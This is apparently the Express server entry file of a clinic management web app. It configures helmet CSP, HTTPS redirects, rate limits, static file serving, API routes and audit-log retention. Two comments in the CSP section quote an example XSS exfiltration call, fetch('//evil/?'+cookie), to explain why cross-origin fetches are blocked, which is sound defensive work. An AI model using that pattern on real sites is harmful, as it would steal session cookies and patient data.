require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const compression = require('compression');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');
const { initDb } = require('./db');

process.env.TZ = 'America/Chicago'; // Zona horaria local (CST/CDT)

const app = express();

// Confiar en proxy de Render para que req.ip refleje la IP real del cliente
// (necesario para que express-rate-limit no agrupe a todo el mundo bajo la IP del LB).
app.set('trust proxy', 1);

// Cache-busting: every deploy changes ASSET_VERSION, which gets appended as ?v=…
// to every local <script src> and <link href>. Browsers then fetch fresh copies
// without users needing a hard refresh. Render exposes RENDER_GIT_COMMIT per deploy.
const ASSET_VERSION =
  (process.env.RENDER_GIT_COMMIT || '').slice(0, 8) || String(Date.now());

const PUBLIC_DIR = path.join(__dirname, 'public');

// Helmet aplica HSTS, X-Frame-Options DENY, X-Content-Type-Options, Referrer-Policy, etc.
// CSP: bloquea cargas de scripts/estilos remotos y restringe fetch a same-origin.
// 'unsafe-inline' está permitido porque el frontend usa muchos onclick="" y <style>;
// migrar a CSP estricta (con nonces) requeriría refactor mayor del frontend.
// La protección clave aquí es connect-src 'self' → un XSS no puede hacer
// fetch('//evil/?'+cookie) porque la cookie es HttpOnly y connect-src bloquea
// destinos cross-origin para exfiltración alternativa.
app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: true,
    directives: {
      defaultSrc: ["'self'"],
      // Allowlist de CDNs que la app usa: Quill (editor de consentimientos), QR generator,
      // React+Babel (ortodoncia/periodoncia). Cualquier nuevo CDN debe agregarse aquí.
      scriptSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://cdn.quilljs.com",
        "https://cdn.jsdelivr.net",
        "https://unpkg.com",
      ],
      // helmet pone script-src-attr: 'none' por default (bloquearía onclick="…"),
      // la app actual depende mucho de event handlers inline → relajado a unsafe-inline.
      // TODO en una segunda iteración: migrar a addEventListener y endurecer.
      scriptSrcAttr: ["'unsafe-inline'"],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://fonts.googleapis.com",
        "https://cdn.quilljs.com",
      ],
      fontSrc: ["'self'", "data:", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "blob:", "https://res.cloudinary.com"],
      // connect-src 'self' es la pieza clave: aunque un XSS sortee 'unsafe-inline',
      // no podrá exfiltrar datos via fetch('//evil/?'+phi) — el browser bloquea
      // cualquier destino que no sea el mismo origen.
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null,
    },
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: 'cross-origin' },
  frameguard: { action: 'deny' },
}));

// Forzar HTTPS en producción (Render termina TLS en el LB).
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' &&
      req.headers['x-forwarded-proto'] &&
      req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, 'https://' + req.headers.host + req.url);
  }
  next();
});

function serveHtmlWithVersion(filePath, res) {
  fs.readFile(filePath, 'utf8', (err, raw) => {
    if (err) {
      res.status(404).end();
      return;
    }
    const html = raw
      .replace(
        /(<script\b[^>]*\bsrc=")(\/[^"?#]+\.js)(")/gi,
        `$1$2?v=${ASSET_VERSION}$3`,
      )
      .replace(
        /(<link\b[^>]*\bhref=")(\/[^"?#]+\.(?:css|js))(")/gi,
        `$1$2?v=${ASSET_VERSION}$3`,
      );
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    res.send(html);
  });
}

// Intercept *.html requests before express.static so we can inject ?v=… into asset URLs
app.use((req, res, next) => {
  if (req.method !== 'GET' && req.method !== 'HEAD') return next();
  let urlPath = decodeURIComponent(req.path);
  if (urlPath.endsWith('/')) urlPath += 'index.html';
  if (!urlPath.endsWith('.html')) return next();
  const filePath = path.join(PUBLIC_DIR, urlPath);
  // Path-traversal guard
  if (filePath !== PUBLIC_DIR && !filePath.startsWith(PUBLIC_DIR + path.sep)) {
    return next();
  }
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (err) return next();
    serveHtmlWithVersion(filePath, res);
  });
});

// gzip/deflate compression — ~5x reduction on the landing HTML
// (most-impactful single change for first paint over slow networks)
app.use(compression({
  threshold: 1024, // only compress responses >= 1KB
  level: 6,
}));

// Límite de payload para mitigar DoS por bodies enormes (multer maneja sus propios límites)
app.use(express.json({ limit: '256kb' }));
app.use(cookieParser());

// Rate-limit global de baja agresividad para frenar enumeración masiva,
// y un limit más estricto en /api/auth/login que se aplica abajo.
const globalLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 300,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas solicitudes, intenta de nuevo en un momento.' },
});
app.use('/api/', globalLimiter);

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  message: { error: 'Demasiados intentos de inicio de sesión. Espera 15 minutos.' },
});
app.use('/api/auth/login', authLimiter);

const publicBookingLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Demasiadas reservas desde esta IP. Intenta más tarde.' },
});
app.use('/api/public/clinic/:clinicId/booking', publicBookingLimiter);

// Static files: hint browsers to cache JS/CSS for a day, HTML always revalidated
const ONE_DAY = 24 * 60 * 60;
app.use(express.static(path.join(__dirname, 'public'), {
  etag: true,
  lastModified: true,
  maxAge: 0,
  // Bloquear archivos sensibles que no deberían exponerse aunque caigan por error en /public
  setHeaders(res, filePath) {
    if (/\.(?:js|css|svg|woff2?|ttf|otf|png|jpe?g|webp|gif|ico)$/i.test(filePath)) {
      res.setHeader('Cache-Control', 'public, max-age=' + ONE_DAY + ', stale-while-revalidate=' + ONE_DAY);
    } else if (/\.html$/i.test(filePath)) {
      res.setHeader('Cache-Control', 'no-cache');
    }
  },
  // No servir archivos de respaldo, dotfiles, ni ficheros marcados como debug/test
  index: 'index.html',
  dotfiles: 'deny',
  extensions: false,
}));
app.use('/uploads', express.static(path.join(__dirname, 'uploads'), {
  maxAge: '7d',
  etag: true,
  dotfiles: 'deny',
}));

app.use('/api/auth', require('./routes/auth'));
app.use('/api/invitations', require('./routes/invitations'));
app.use('/api/clinics', require('./routes/clinics'));
app.use('/api/users', require('./routes/users'));
app.use('/api/patients', require('./routes/patients'));
app.use('/api/consultations', require('./routes/consultations'));
app.use('/api/appointments', require('./routes/appointments'));
app.use('/api/consents', require('./routes/consents'));
app.use('/api/reminders', require('./routes/reminders'));
app.use('/api/assistant', require('./routes/assistant'));
app.use('/api/assistant', require('./routes/assistant-intent'));
app.use('/api/conversation', require('./routes/conversation'));
app.use('/api/public', require('./routes/public-booking'));
app.use('/api/doctor-availability', require('./routes/doctor-availability'));
app.use('/api/rooms', require('./routes/rooms'));
app.use('/api/reception', require('./routes/reception'));
app.use('/api/inventory', require('./routes/inventory'));
app.use('/api/inventory-usage', require('./routes/inventory-usage'));
app.use('/api/audit', require('./routes/audit'));

app.get('*', (req, res) => {
  serveHtmlWithVersion(path.join(PUBLIC_DIR, 'index.html'), res);
});

// Global error handler — never leak stacktraces or raw messages to clients en producción
app.use((err, req, res, next) => {
  console.error('Unhandled route error:', err);
  if (res.headersSent) return next(err);
  const exposeDetail = process.env.NODE_ENV !== 'production';
  res.status(500).json({ error: exposeDetail ? (err.message || 'Internal server error') : 'Internal server error' });
});

const PORT = process.env.PORT || 3000;

(async () => {
  try {
    await initDb();

    // Tarea de retención: audit_logs > 90 días se borran cada 24h.
    // Ejecuta una vez al arrancar y luego en intervalo, no requiere cron externo.
    const AuditService = require('./lib/audit/service');
    const auditSvc = new AuditService();
    const AUDIT_RETENTION_DAYS = parseInt(process.env.AUDIT_RETENTION_DAYS || '90', 10);
    const runPurge = async () => {
      try {
        const r = await auditSvc.purgeOlderThan(AUDIT_RETENTION_DAYS);
        if (r.deleted > 0) console.log(`[audit] purged ${r.deleted} logs > ${r.days}d`);
      } catch (_) {}
    };
    setTimeout(runPurge, 30 * 1000);                // primera corrida 30s después del arranque
    setInterval(runPurge, 24 * 60 * 60 * 1000);     // cada 24 horas

    app.listen(PORT, () => {
      console.log(`\nSaludDigital running → http://localhost:${PORT}\n`);
    });
  } catch (err) {
    console.error('Failed to start server:', err);
    process.exit(1);
  }
})();
